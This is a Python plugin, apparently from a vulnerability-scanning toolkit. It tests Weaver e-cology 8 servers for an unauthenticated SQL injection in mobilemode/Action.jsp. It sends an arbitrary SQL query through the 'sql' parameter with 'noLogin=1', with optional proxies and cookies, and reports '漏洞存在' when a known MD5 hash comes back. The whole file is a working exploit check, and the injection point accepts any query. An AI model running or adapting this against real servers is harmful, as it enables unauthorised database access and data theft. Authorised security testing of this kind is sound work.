import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                   }
        path = "mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1"
        logging.captureWarnings(True)
        aa1 = requests.get(url1 + path, cookies=s_cookie,headers=headers,proxies=proxies, verify=False, timeout=5)
        if aa1.status_code==200 and "0xe10adc3949" in aa1.text:
            cdd='[+]漏洞存在\n'+path
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 e-cology8_Action.jspSQL注入 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)